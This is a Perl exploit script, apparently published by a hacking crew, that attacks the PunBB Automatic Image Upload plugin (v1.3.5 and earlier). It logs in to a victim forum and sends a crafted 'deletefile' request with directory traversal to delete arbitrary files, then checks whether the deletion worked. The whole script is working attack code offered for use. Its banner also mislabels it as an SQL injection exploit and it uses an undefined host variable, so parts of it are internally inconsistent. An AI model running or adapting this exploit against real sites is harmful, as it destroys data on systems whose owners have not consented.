#!/usr/bin/perl
#[0-Day] PunBB Automatic Image Upload <= v1.3.5 Delete Arbitrary File Vulnerability
#Coded By Dante90, WaRWolFz Crew
#Bug Discovered By: Dante90, WaRWolFz Crew
#Works only if '$Allow_Delete[] = "[USERGROUP]";' is not commented in "uploadimg_config.php" [FIND LINE: 75]. Example:
#//$Allow_Delete[] = "Members"; => $Allow_Delete[] = "Members";

use LWP::UserAgent;
use HTTP::Cookies;

my ($UserName,$PassWord,$DirectoryFile,$DeleteFile) = @ARGV;

if(@ARGV < 4){
    &usage();
    exit();
}

my $Message = "";
my $Host = "http://www.example.com/path/"; #Insert Victime Web Site Link
my $Referrer = "http://www.warwolfz.com/";

my $Cookies = new HTTP::Cookies;
my $UserAgent = new LWP::UserAgent(
            agent => 'Mozilla/5.0',
            max_redirect => 0,
            cookie_jar => $Cookies,
        ) or die $!;

sub Login(){
    my $Login = $UserAgent->post($HostName.'/login.php?action=in',
                [
                    form_sent        => '1',
                    redirect_url    => 'index.php',
                    req_username    => $UserName,
                    req_password    => $PassWord,
                    login => 'Login',
                ]) || die $!;

    if($Login->content =~ /Logged in /i){
        return 1;
    }else{
        return 0;
    }
}

if (Login() == 1){
    $Message = " * Logged in as: " . $UserName;
}elsif (Login() == 0){
    $Message = " * Login Failed.";
}

my $Get = $UserAgent->get($HostName."./uploadimg_view.php?view=gallery&p=1&deletefile=./".$DirectoryFile."/".$DeleteFile);
my $GetFile = $UserAgent->get($HostName."./uploads/".$DirectoryFile.$DeleteFile);

if($Get->content =~ /<b>Warning<\/b>: /i){
    refresh($Message, $HostName, "", "");
    print " * Error deleting sensible data.\n";
    print " * Exploit Failed                                     *\n";
    print " ------------------------------------------------------ \n\n";
}elsif ($GetFile->as_string =~ /404 Not Found/i){
    refresh($Message, $HostName, $DirectoryFile, $DeleteFile);
    print " * File Deleted                                       *\n";
    print " * Exploit Successed                                  *\n";
    print " ------------------------------------------------------\n\n";
    system("pause");
}else{
    refresh($Message, $HostName, "", "");
    print " * General Error. Maybe the file was deleted the same ;)\n";
    print " * Control manually: ".$HostName."./uploads/".$DirectoryFile.$DeleteFile."\n";
    print " * Error deleting sensible data.\n";
    print " * Exploit Failed                                     *\n";
    print " ------------------------------------------------------ \n\n";
}

sub usage{
    system("cls");
    {
        print " \n [0-Day] PunBB Automatic Image Upload <= v1.3.5 Remote SQL Injection Exploit\n";
        print " ------------------------------------------------------ \n";
        print " * USAGE:                                             *\n";
        print " * cd [Local Disk]:\\[Directory Of Exploit]\\           *\n";
        print " * perl name_exploit.pl [id]                          *\n";
        print " ------------------------------------------------------ \n";
        print " *         Powered By Dante90, WaRWolFz Crew          *\n";
        print " * www.warwolfz.org - dante90_founder[at]warwolfz.org *\n";
        print " ------------------------------------------------------ \n";
    };
    exit;
}

sub refresh{
    system("cls");
    {
        print " \n [0-Day] PunBB Automatic Image Upload <= v1.3.5 Remote SQL Injection Exploit\n";
        print " ------------------------------------------------------ \n";
        print " * USAGE:                                             *\n";
        print " * cd [Local Disk]:\\[Directory Of Exploit]\\           *\n";
        print " * perl name_exploit.pl [id]                          *\n";
        print " ------------------------------------------------------ \n";
        print " *         Powered By Dante90, WaRWolFz Crew          *\n";
        print " * www.warwolfz.org - dante90_founder[at]warwolfz.org *\n";
        print " ------------------------------------------------------ \n";
    };
    print $_[0] ."\n";
    print " * Victime Site: " . $_[1] . "\n";
    print " * Directory: " . $_[2] . "\n";
    print " * File: " . $_[3] . "\n";
}

#WaRWolFz Crew

